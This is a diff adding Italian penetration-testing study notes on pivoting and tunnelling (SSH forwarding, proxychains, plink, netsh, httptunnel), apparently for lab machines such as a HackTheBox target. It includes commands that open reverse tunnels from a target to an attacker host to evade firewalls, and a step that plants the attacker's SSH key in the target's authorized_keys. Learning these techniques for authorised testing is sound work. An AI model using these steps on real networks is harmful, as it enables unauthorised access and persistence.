@@ -1,0 +1,86 @@
+RINETD PORT FORWARD:
+    //aggiungi regole in cat /etc/rinetd.conf nella sezione forwarding rules come here
+    0.0.0.0 80 216.58.207.142 80        //bindadress    bindport  connectaddress  connectport , tutto il traffico che va sulla porta 80 su qualunque interface (0.0.0.0) viene ridirezionato verso la porta 80 dell'host 216.58.207.142
+    //dopo aver fatto una modifica si deve restartare il servizio con sudo service rinetd restart
+
+
+
+PROXYCHAINS:
+    //per configurare proxychains basta modificare il file /etc/proxychains.conf:
+    # add proxy here ...
+    # meanwile
+    # defaults set to "tor"
+    socks4 	127.0.0.1 9050
+    //di default proxychains cerca il file prima nella current directory, poi nella home directory dell'utente e se non li trova lo cerca in /etc/
+    //per far funzionare un comando con proxychains basta aggiungere anche proxychains prima del nome del comando:
+    sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.22
+
+
+
+SSH PORT FORWARD:
+    //local port forwarding  (-L) (tunnel a local port to a remote server) 
+    //manda tutte le richieste inviate alla porta locale 445 al server remoto 192.168.1.20 (a cui non ho accesso per configurazioni di rete) 
+    //passando attraverso il server 10.11.0.22 usando l'account student
+    //sintassi: sudo ssh -N -L [<bind_address>:]<bind_port>:<dest_host>:<dest_port> [<username>@<address>]
+    sudo ssh -N -L 0.0.0.0:445:192.168.1.20:445 student@10.11.0.22 
+
+    //remote port forwarding (-R) (apre una porta sull'host remoto e il traffico che arriva a quella porta viene mandato a una porta sulla macchina locale, una sorta di reverse local port forwarding)
+    //si può attivare ad esempio sulla macchina target per aggirare il firewall:
+    //apro la porta remota 2221 sulla macchina attaccante (fornendo le credenziali nel comando eseguito sulla macchina target) e la associo alla porta locale 3306
+    //questo permetterà di fare il forward di tutte le connessioni sulla macchina attaccante sulla porta 2221 alla porta 3306 della macchina target
+    //si può usare questoi metodo invece del local port forwarding per problematiche di firewall che bloccano la creazione di connessioni ssh inbound ma le permettono outbound
+    //oppure per problematiche legate alle credenziali ssh ecc
+    //sintassi: sudo ssh -N -L <remote_address>:<remote_port>:<host>:<port> [<username>@<address>]
+    sudo ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4	
+
+    //dynamic port forwarding (-D) (set a local listening port and have it tunnel incoming traffic to any remote destination through the use of a proxy)
+    //a differenza di remote e local che fanno riferimento ad un unico ip e porta in questo caso attraverso la prta locale può passare traffico verso qualunque host/porta
+    //non avendo più un destination address preciso però tutto il traffico va direzionato (USARE PROXYCHAINS)
+    //sintassi: sudo ssh -N -D <bind_address>:<bind_port> <username>@<ssh_server>
+    sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128        
+
+
+
+PLINK PORT FORWARD (WINDOWS):
+    //remote port forwarding (-R)
+    plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+    //per evitare di dover insierire l'input (se si vuole o no mettere l'host in cache) che potrebbe creare problemi per shell non interattive si può usare:
+    cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4
+
+NETSH (WINDOWS):
+    //local port forward con netsh (preinstallato su windows)
+    //per funzionare ha bisogno di permessi di system, ip helper service funzionante (si può controllare se è abilitato da Windows Services) e ipv6 abilitato (si può controllare da network interface settings)
+    netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
+    //così dalla macchina kali posso collegarmi alla 192.168.1.110 sfruttando la macchina windows "nel mezzo" (la 10.11.0.22 ovvero listenaddress/listenport)
+
+
+HTTP TUNNELING:
+    //da combinare solitamente con port forward ecc
+    sudo apt update && sudo apt install httptunnel
+    //start httptunnel server, che riceverà il traffico su una porta (1234), lo "decapsula" dal protocollo http, e lo manda verso un'altra porta (localhost:8888)
+    hts --forward-port localhost:8888 1234
+    //start httptunnel client che prende il traffico che viene mandato verso una porta locale verso cui vanno i nostri comandi (8080), lo incapsula in uno stream HTTP e lo manda verso 10.11.0.128:1234 (dove ci sarà il server hts che lo toglie dall'incapsulamento e lo inoltra a sua volta)
+    htc --forward-port 8080 10.11.0.128:1234
+
+    //ovviamente tutti i dati inseriti devono coincidere con quelli presenti nei vari port-forward impostati tra le macchine che contengo il client e il server
+    (in questo caso la macchina attaccante ha il client che manda il traffico come HTTP e non RDP o SSH per aggirare il firewall, la macchina "intermedia" che fa da pivot ha il server hts che ripristina il traffico decapsulandolo dall'HTTP e lo manda poi alla macchina della rete interna, questo è possibile perchè tra le due macchine "interne" non c'è firewall o comunque non c' deep packet inspection)
+    
+
+
+OTHER:
+    per usare SMB con port forward si deve settare min protocol=SMB2 in /etc/samba/smb.conf             (??)
+
+
+
+ESEMPIO:
+    TARGET:
+        mkdir ~/.ssh            //se non esiste
+    ATTACKER:
+        ssh-keygen -t rsa
+    TARGET (in ~/.ssh):
+        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEvSjWQSLI51+FranQDG6chUTFNk4L9SiML1+VfEUCfaHcDoynurn6cez0x+twonYmHVHPY7YCR3DxVIzdvK7wXHJcrLSuWeYrPnaXAv3UjcZW9ixD+rwN2zTJ286K/gjQ1E3LTHMHAphgGTZ0SQGxfBDrSuBGJO3hw9OrefO2HUzKSSEfPJZaXuzHxOMKflBhrnUPk82xtFl4jc465OEKZSkDHPaQtvxBf6GQyOXLThI7t1ncjLLmbQT3kDUMMCHO3Cn3JTG85BND9AJc3cdR4zkrY0yPQ1AFqbD1zznhopK7mhGU3AQzd34/gCqCXNXbsuELzs7YstRwP+uXd8jj0e9sqFM3+GCqXGovGa9ki5FRhXN7ux6/LiwLfs+d4gQHRhR0gHcK/64xmMbiahUpbYNTel5lMRnWV6l789005FQ05JM8Ae0KMhQR7gpaeaGqmk/wU87Cb1J+CxIhtgLFLLIVfT6idy+MJ0I9mjJzM89FUMrR0q8bdT2Wi0QMVr0= daerves@kali" > authorized_keys      //echo "la .pub"
+    ATTACKER:
+        chmod 600 d             //d è il file contente la chiave privata
+        sudo ssh -i d -L 8000:127.0.0.1:8000 strapi@horizontall.htb
+        //a questo punto qualunque richiesta inviata alla porta 8000 di localhost viene inviata alla porta 8000 di horizontall.htb e da questa viene inoltrata di nuovo a localhost sulla porta 8000 (invece che ad un terzo server) così è come avere il servizio in locale
